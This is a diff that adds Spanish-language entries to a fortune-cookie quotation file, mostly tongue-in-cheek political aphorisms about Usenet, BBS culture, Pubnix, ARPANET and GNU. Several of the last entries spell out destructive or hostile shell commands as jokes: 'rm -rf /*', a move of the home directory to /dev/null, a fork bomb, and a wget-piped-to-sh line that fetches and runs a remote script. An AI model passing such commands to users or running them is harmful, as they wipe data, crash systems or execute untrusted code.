@@ -4270,6 +4270,90 @@ UUCP hizo posible a cualquier computadora con Unix discar automáticamente a tra
 %
 Los primeros nodos de lo que se conoce como Usenet comenzaron en 1980. Como otros antes que ellos, no tenían idea de que crecería hasta cubrir el mundo.
 %
-Usenet, destinada a representar la red de usuarios de Unix, fue diseñado como un foro para discusiones sobre Unix y para la resolución de problemas de Unix.
+La Jerarquía de Usenet no comprende una cadena de mando sino una forma de simplificar grandes agrupamientos de información mediante la categorización arbolada.
+%
+Usenet estaba originalmente destinada a representar la red de usuarios de Unix que diseñaran un un foro para discusiones sobre Unix, para la resolución de problemas de Unix.
+%
+Las FAQs son un destilado del Usenet.
+%
+Usenet es el voluntariado de las Masas Electrónicas.
+%
+El debate más grande de la historia posiblemente exista en Usenet.
+%
+Los compañeros que interconectaron sus computadoras personales a través de líneas telefónicas, crearon un verdadero uso popular de la tecnología, las carteleras electrónicas BBS.
+%
+Si un BBS es una tecnología democratizadora, no existe tal cosa.
+%
+La fuente puede recibir energía, pero el verdadero poder brota del puerto Ethernet.
+%
+Por menos de lo que cuesta un fusil, una BBS ideologizada convierte a un descamisado de cualquier parte del mundo en editor, reportero testigo, defensor, organizador, estudiante o maestro y participante potencial en una conversación mundial entre compañeros.
+%
+La telemática comunitaria y la rica y diversa cultura de las BBS no fueron creadas por diseñadores de armas apocalípticas o investigadores corporativos, sino por compañeros.
+%
+Al igual que las unidades básicas, los Pubnix crecen desde cero, se autopropagan y son difíciles de erradicar.
+%
+Si los enlaces de alta velocidad de Internet desapareciesen mañana, las BBS y el Usenet podrían seguir operando por cualquier intermedio, incluido el éter radioeléctrico.
+%
+No hay manera de acabar con las subculturas de las BBS, a menos que se desconecte el sistema telefónico y se impida el libre uso del microprocesador.
+%
+Un BBS es una microcomputadora que corre un software BBS, conectada a una línea telefónica común gracias a un pequeño dispositivo electrónico llamado módem.
+%
+Una BBS es también herramental de ideologización.
+%
+Utiliza un Pubnix para organizar un movimiento, coordinar una campaña política, encontrar una audiencia para tu arte y diatribas políticas, y confluye con almas de ideas afines para discutir asuntos de interés mutuo.
+%
+Gran parte de la cultura BBS es mundana, pueril o esotérica.
+%
+Exprésate en los Tildes como alternativa cruda e inmediata a la cultura propagada por los medios concentrados de comunicación.
+%
+Conecta un módem a tu computadora, conecta el módem a a la red telefónica, disca el número de alguna BBS existente, e ideologiza a los demás.
+%
+Las BBS tienen algo en común con los "zines", aquellos folletines y revistas caseras de pequeña tirada.
+%
+Los compañeros que a través de Pubnix se conectan en grupos de diez a cien definen su propia realidad.
+%
+En 1970 ARPANET estuvo en línea, permitiendo tomar decisiones grupales de manera asíncrona y geográficamente distribuida.
 %
 ARPANET ampliaba las capacidades de comunicación y búsqueda de información, siempre y cuando se estuviera afiliado a una de las instituciones de investigación que ARPA o NSF autorizaban para el acceso a la red.
+%
+El Sistema Electrónico de Intercambio de Información, EIES constituyó un laboratorio experimental de comunicación electrónica de 1976, para uso de comunidades de investigación geográficamente dispersas.
+%
+Nuestros hackers descamisados vivieron con muy poco dinero durante años, invirtieron su dinero en hardware de última generación, programaron su propio software y crearon una serie de comunidades enlazadas telemáticamente.
+%
+Utiliza las comunicaciones mediadas por computadora para lograr la reconciliación, la comunidad organizada, y un mejor entendimiento.
+%
+La buena tecnología se autopropaga.
+%
+Escribe un software de comunicación autopropagante si deseas germinar una red de datos controlada.
+%
+Un gusano informático es sólo un software de comunicación autopropagante destinado a germinar una red de comunicaciones dominada.
+%
+Sigue agregando tus bienvenidos bugs a nuestros programas.
+%
+Cambia los 0s en 1s hasta que tu programa esté completo, y ponlo a correr.
+%
+Difícilmente cualquier conjunto de mil palabras pueda describirse con imágenes.
+%
+Si le hubiese preguntado al Pueblo qué quería, me habrían dicho módems más veloces.
+%
+Pagarán el precio de su falta de baudios.
+%
+Al FTP cualquier descarga le parece razonable.
+%
+Los usuarios no necesitan ciber-oligarcas.
+%
+Colgarse es humano. Rebootear es maquinal.
+%
+GNU revoluciona la CPU.
+%
+HURD será lo que deba ser, o no será nada.
+%
+La orden rm -rf /* simplemente le transmite al intérprete "¿Puedes por favor borrar todos los datos del sistema por mí?"
+%
+La orden mv ~/* /dev/null transportará los datos del $USER a un agujero negro informático, destruyendo sus datos.
+%
+Usa la orden de shell :(){:|:&};: para ocupar recursivamente recursos informáticos del sistema en que estás logueado hasta agotarlos.
+%
+Utiliza wget http://codigo_maligno -O- | sh para correr telemáticamente un script maligno.
+%
+No es labor de UNIX impedir que el root se pegue un tiro en el pie.
